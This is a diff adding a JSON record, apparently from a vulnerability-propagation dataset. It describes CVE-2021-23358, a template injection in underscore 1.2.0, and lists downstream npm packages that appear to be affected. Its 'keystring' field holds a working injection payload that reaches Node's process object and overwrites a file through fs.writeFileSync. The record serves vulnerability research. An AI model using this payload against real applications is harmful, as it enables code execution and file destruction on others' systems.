@@ -1,0 +1,25 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.2.0",
+  "keymethod": "templateSettings.variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "ql.io-mutable-uri@0.3.0",
+    "assetgraph-builder@1.8.64",
+    "roy@0.1.4",
+    "ql.io-mon@0.3.0",
+    "assetgraph@0.3.12",
+    "ax@0.0.2",
+    "assetgraph-sprite@0.2.1",
+    "jspackle@1.0.1",
+    "rephraser@0.1.0",
+    "backbone-nowjs@0.1.2",
+    "percept@0.0.1",
+    "sjson5@0.1.5",
+    "mocking-server@0.0.1",
+    "server-tracker@0.3.2",
+    "memonic@0.0.1",
+    "appborg@0.0.14"
+  ]
+}
